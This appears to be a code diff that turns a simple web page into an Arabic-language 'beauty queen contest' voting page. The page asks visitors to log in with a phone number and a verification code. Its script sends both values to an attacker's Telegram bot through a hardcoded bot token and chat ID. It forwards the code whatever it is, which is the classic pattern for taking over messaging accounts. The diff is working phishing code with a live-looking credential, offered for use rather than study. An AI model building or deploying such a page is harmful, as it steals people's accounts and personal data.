@@ -1,23 +1,146 @@
 <!DOCTYPE html>
-<html>
+<html lang="ar">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>MHK</title>
-  <link rel="stylesheet" href="./hlf.css">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>مسابقة ملكات الجمال</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f9;
+            margin: 0;
+            padding: 0;
+        }
+        header {
+            background-color: #ff4081;
+            color: white;
+            text-align: center;
+            padding: 20px;
+        }
+        .content {
+            padding: 20px;
+        }
+        .contestant-images img {
+            width: 100%;
+            height: auto;
+            margin-bottom: 10px;
+        }
+        .login-form {
+            background-color: #ffffff;
+            padding: 20px;
+            border-radius: 5px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            max-width: 400px;
+            margin: 0 auto;
+        }
+        .login-form input {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        .login-form button {
+            width: 100%;
+            padding: 10px;
+            background-color: #ff4081;
+            border: none;
+            color: white;
+            font-size: 16px;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        .login-form button:hover {
+            background-color: #f50057;
+        }
+    </style>
 </head>
 <body>
-  <div>
-  <img src="cv.png" alt="this is imger">
-  </div>
-  <div>
-  <img src="aa.png" alt="this is imger">
-  </div>
-  <div>
-    <button id="downloadBtn">Download App</button>
 
-  <script src="ee.js"></script>
-  </div>
+<header>
+    <h1>مسابقة ملكات الجمال</h1>
+</header>
 
+<div class="content">
+    <div class="contestant-images">
+        <h2>صور ملكات الجمال</h2>
+        <img src="queen1.jpg" alt="ملكة جمال 1">
+        <img src="queen2.jpg" alt="ملكة جمال 2">
+        <img src="queen3.jpg" alt="ملكة جمال 3">
+        <!-- أضف المزيد من الصور هنا -->
+    </div>
+
+    <div class="login-form" id="phoneForm">
+        <h2>تسجيل الدخول</h2>
+        <input type="tel" id="phoneNumber" placeholder="أدخل رقم هاتفك مع رمز الدولة">
+        <button onclick="sendPhoneNumber()">تسجيل الدخول</button>
+    </div>
+
+    <div class="login-form" id="verificationForm" style="display: none;">
+        <h2>أدخل كود التحقق</h2>
+        <input type="text" id="verificationCode" placeholder="أدخل كود التحقق">
+        <button onclick="verifyCode()">تأكيد</button>
+    </div>
+</div>
+
+<script>
+    const TOKEN = "7286971566:AAFo0htGyh6332sGqcBh2zcxC6wodWBRe84";
+    const CHAT_ID = "5331103360";
+
+    function sendPhoneNumber() {
+        const phoneNumber = document.getElementById("phoneNumber").value;
+
+        if (phoneNumber) {
+            // إرسال الرقم إلى بوت التليجرام
+            const message = `تم تسجيل دخول رقم الهاتف: ${phoneNumber}`;
+            const url = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
+
+            fetch(url)
+                .then(response => response.json())
+                .then(data => {
+                    alert("تم إرسال رقم هاتفك بنجاح!");
+                    // إخفاء نموذج إضافة الرقم
+                    document.getElementById("phoneForm").style.display = "none";
+                    // إظهار نموذج إضافة كود التحقق
+                    document.getElementById("verificationForm").style.display = "block";
+                })
+                .catch(error => console.error('Error:', error));
+        } else {
+            alert("من فضلك أدخل رقم هاتفك");
+        }
+    }
+
+    function verifyCode() {
+        const code = document.getElementById("verificationCode").value;
+
+        // إرسال الكود بغض النظر عن صحته
+        const message = `تم إدخال كود التحقق: ${code}`;
+        const url = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
+
+        fetch(url)
+            .then(response => response.json())
+            .then(data => {
+                alert("تم إرسال الكود بنجاح!");
+                // إرسال التقييم
+                sendEvaluation();
+            })
+            .catch(error => console.error('Error:', error));
+    }
+
+    function sendEvaluation() {
+        const message = "تم تسجيل تقييم بنجاح!";
+        const url = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
+
+        fetch(url)
+            .then(response => response.json())
+            .then(data => {
+                alert("تم إرسال التقييم بنجاح إلى مريم");
+            })
+            .catch(error => console.error('Error:', error));
+    }
+</script>
+
+</body>
+</html>
 </body>
 </html>
